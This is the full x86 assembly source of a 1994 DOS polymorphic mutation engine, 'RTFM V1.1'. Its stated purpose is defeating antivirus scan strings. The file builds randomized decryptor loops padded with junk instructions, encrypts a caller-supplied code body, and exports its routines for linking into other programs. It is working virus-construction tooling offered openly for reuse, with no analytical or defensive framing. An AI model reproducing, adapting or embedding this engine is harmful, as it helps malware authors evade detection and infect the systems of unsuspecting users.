;------------------------------------------------------------------------------
;
; Rajaats Tiny Flexible Mutator (RTFM) V1.1 (C) 1994 by Rajaat
;
; Purpose : making it impossible to use scan strings
;
; Input :
;       DS:SI   = piece of code to encrypt
;       ES:SI   = place of decryptor+encrypted code
;       CX      = length of code (include the mutator (mut_len))
;       BX      = offset of decryptor in file
;       AX      = flag bits
;                       0 = 1 do not use junk code
; Output :
;       DS:DX   = place of decryptor+encrypted code
;       CX      = length of encrypted code+decryptor
;       BP      = preserved
;       Other registers might be trashed
;
; History :
;       1.0     initial version
;       1.1     the decrease counter can get an add or sub
;               the increase pointer can get an add or sub
;               added random byte operation with one register as trash function
;
;------------------------------------------------------------------------------
SMART
JUMPS

_text           segment 'text'
                assume cs:_text

.radix 16

                public mut_top
                public mut_bottom
                public mut_len
                public rnd_init
                public rnd_get
                public mutate

dos_get_time    equ 2c
dos_get_date    equ 2a

mut_bottom      = $
reg             enum    _ax,_cx,_dx,_bx,_sp,_bp,_si,_di

seed            dw 0
count           dw 0
ofs             dw 0
dest            dw 0
indexbyte       db 00000000b
countbyte       db 00000000b
process         db 00000000b    ; bit 0 : 1 = count register set up
                                ;     1 : 1 = index register set up
                                ;     2 : 1 = don't use junk code

decraddr        dw 0
loopaddr        dw 0

opertab         db 30,0,28
trash           equ $
                cmc
                clc
                stc
                nop

mutate:         push bp
                push ds
                push es
                push si
                call mut_delta
mut_delta:      pop bp
                sub bp,offset mut_delta
                mov byte ptr cs:[process][bp],0
                mov byte ptr cs:[indexbyte][bp],0
                mov byte ptr cs:[countbyte][bp],0
                mov word ptr cs:[count][bp],cx
                mov word ptr cs:[ofs][bp],bx
                mov word ptr cs:[dest][bp],di
                test al,1
                jnz usejunk
                or byte ptr cs:[process][bp],4
usejunk:        call rnd_init
setaction:      mov al,byte ptr cs:[process][bp]
                and al,3
                cmp al,3
                jz setregsok
                jmp setregs
setregsok:      call insert_trash
                mov word ptr cs:[loopaddr][bp],di
                mov ax,802e
                stosw
getoper:        call rnd_get
                and ax,3
                or al,al
                jz getoper
                mov bx,ax
                add bx,bp
                push ds
                push cs
                pop ds
                lea si,opertab[bx-1]
                lodsb
                pop ds
                mov byte ptr cs:[action][bp],al
                cmp al,30
                jz noaddsubflip
                xor byte ptr cs:[action][bp],28
noaddsubflip:   add al,byte ptr cs:[indexbyte][bp]
                test al,4
                jnz toomuch
                xor al,6
toomuch:        xor al,2
                stosb
                call rnd_get
                stosb
                push ax
                call insert_trash
                call rnd_get
                test al,1
                jnz ptrinc
                test al,2
                jnz ptrsub
                mov ax,0c083
                add ah,byte ptr cs:[indexbyte][bp]
                stosw
                mov al,01
                stosb
                jmp makecount
ptrsub:         mov ax,0e883
                add ah,byte ptr cs:[indexbyte][bp]
                stosw
                mov al,0ffh
                stosb
                jmp makecount
ptrinc:         mov al,40
                add al,byte ptr cs:[indexbyte][bp]
                stosb
makecount:      call insert_trash
                call rnd_get
                test al,1
                jnz countdec
                test al,2
                jnz countsub
                mov ax,0c083
                add ah,byte ptr cs:[countbyte][bp]
                stosw
                mov al,0ff
                stosb
                jmp makeloop
countsub:       mov ax,0e883
                add ah,byte ptr cs:[countbyte][bp]
                stosw
                mov al,01
                stosb
                jmp makeloop
countdec:       mov al,48
                add al,byte ptr cs:[countbyte][bp]
                stosb
makeloop:       mov al,75
                stosb
                mov ax,word ptr cs:[loopaddr][bp]
                sub ax,di
                dec ax
                stosb
                call insert_trash
                mov ax,di
                sub ax,word ptr cs:[dest][bp]
                add ax,word ptr cs:[ofs][bp]
                push di
                mov di,word ptr cs:[decraddr][bp]
                stosw
                pop di
                pop ax
                xchg al,ah
                pop si
                mov cx,word ptr cs:[count][bp]
encrypt:        lodsb
action          equ $
                db 0,0e0
                stosb
                loop encrypt
                mov cx,di
                mov dx,word ptr cs:[dest][bp]
                sub cx,dx
                pop es
                pop ds
                pop bp
                ret

setregs:        call insert_trash
                call rnd_get
                test al,1
                jnz firstcount
                testflag byte ptr cs:[process][bp],2
                jnz return
                setflag byte ptr cs:[process][bp],2
                call set_index
                jmp setaction
firstcount:     testflag byte ptr cs:[process][bp],1
                jnz return
                setflag byte ptr cs:[process][bp],1
                call set_count
return:         jmp setaction

set_index:      call rnd_get
                and al,1
                or al,6
                test ah,1
                jz nobx
                mov al,_bx
nobx:           cmp al,byte ptr cs:[countbyte][bp]
                jz set_index
                mov byte ptr cs:[indexbyte][bp],al
                add al,0b8
                stosb
                mov word ptr cs:[decraddr][bp],di
                stosw
                ret

set_count:      call rnd_get
                and al,7
                cmp al,byte ptr cs:[indexbyte][bp]
                jz set_count
                cmp al,_sp
                jz set_count
                mov byte ptr cs:[countbyte][bp],al
                add al,0b8
                stosb
                mov ax,word ptr cs:[count][bp]
                stosw
                ret

insert_trash:   test byte ptr cs:[process][bp],4
                jnz trasher
                ret
trasher:        call rnd_get
                test ah,1
                jnz specialtrash
                and ax,3
                or ax,ax
                jz trash_done
                mov cx,ax
more_trash:     call rnd_get
                and ax,3
                lea bx,trash[bp]
                add bx,ax
                mov al,byte ptr cs:[bx]
                stosb
                loop more_trash
trash_done:     ret
specialtrash:   call rnd_get
                and al,7
                cmp al,_sp
                jz specialtrash
                cmp al,byte ptr cs:[indexbyte][bp]
                je specialtrash
                cmp al,byte ptr cs:[countbyte][bp]
                je specialtrash
                test ah,1
                jz domov
                test ah,2
                jz doinc
                test ah,4
                jz dodec
                mov al,083
                stosb
regtrash:       call rnd_get
                mov ah,al
                and al,7
                cmp al,_sp
                jz regtrash
                cmp al,byte ptr cs:[indexbyte][bp]
                jz regtrash
                cmp al,byte ptr cs:[countbyte][bp]
                jz regtrash
                mov al,ah
                or al,0c0
                stosb
                call rnd_get
                stosb
                ret
dodec:          add al,8
doinc:          add al,40
                stosb
                ret
domov:          add al,0b8
storeit:        stosb
                call rnd_get
                stosw
                ret

rnd_init:       mov ah,dos_get_time
                int 21
                xor cx,dx
                mov word ptr cs:[seed][bp],cx
                mov ah,dos_get_date
                int 21
                mov cl,al
                rcr dx,cl
                not dx
                sbb word ptr cs:[seed][bp],dx
                ret
rnd_get:        push bx
                mov bx,word ptr cs:[seed][bp]
                in al,40
                xchg ah,al
                in al,40
                xor ax,bx
                sbb ax,bx
                ror ax,1
                mov word ptr cs:[seed][bp],ax
                pop bx
                ret

                db '[RTFM]'

mut_top         = $
mut_len         = mut_top-mut_bottom+0fh

_text           ends
end

